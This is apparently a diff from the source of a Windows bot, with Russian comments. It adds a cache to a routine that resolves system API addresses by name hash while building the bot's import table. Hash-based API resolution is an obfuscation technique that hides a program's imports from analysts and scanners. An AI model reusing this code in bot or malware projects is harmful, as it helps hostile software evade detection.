@@ -8,6 +8,15 @@
 #include "ntdll.h"
 
 
+
+
+//----------------------------------------------------------------
+//  Глобальный блок памяти для кеширования апи адресов
+//----------------------------------------------------------------
+LPVOID* GlobalApiCache = NULL;
+//----------------------------------------------------------------
+
+
 DWORD GetImageBase()
 {
 
@@ -106,12 +115,28 @@ static bool BuildBotImportTable()
 	}
 	return true;
 }
+//-----------------------------------------------------------------------------
+
+DWORD* ApiCacheHashes = NULL;
 
 BOOL InitializeAPI()
 {
+	// Инициализируем глобальный кэш
+	GlobalApiCache = NULL;
+
+	if (ApiCacheSize > 0)
+	{
+		ApiCacheHashes = (DWORD*)MemAlloc((ApiCacheSize + 1)*sizeof(DWORD));
+
+		GlobalApiCache = (LPVOID*)MemAlloc((ApiCacheSize + 1)*sizeof(LPVOID));
+		m_memset(GlobalApiCache, 0, (ApiCacheSize + 1)*sizeof(LPVOID));
+	}
+
+
 	BuildBotImportTable();
 	return true;
 }
+//-----------------------------------------------------------------------------
 
 DWORD pGetLastError()
 {
@@ -521,6 +546,40 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 
 	return ret;
 }
+
+
+
+LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex)
+{
+	// Функция возвращает адрес функции используя кэш
+	LPVOID Addr = NULL;
+
+
+	// Пытаемся получить адрес из кэша
+	bool UseCache = GlobalApiCache != NULL && CacheIndex > 0 && CacheIndex <= ApiCacheSize;
+
+	if (UseCache)
+	{
+		Addr =  GlobalApiCache[CacheIndex];
+		if (Addr && ApiCacheHashes[CacheIndex] != dwProcNameHash)
+		{
+			Addr = NULL;
+		}
+	}
+
+	if (!Addr)
+	{
+		// Функции нет в кэше. Получаем её адрес и добавляем в кэш
+		Addr = GetProcAddressEx(Dll, dwModule, dwProcNameHash);
+		if (UseCache)
+		{
+			GlobalApiCache[CacheIndex] = Addr;
+			ApiCacheHashes[CacheIndex] = dwProcNameHash;
+		}
+	}
+	return Addr;
+}
+
 
 
 //****************************************************************
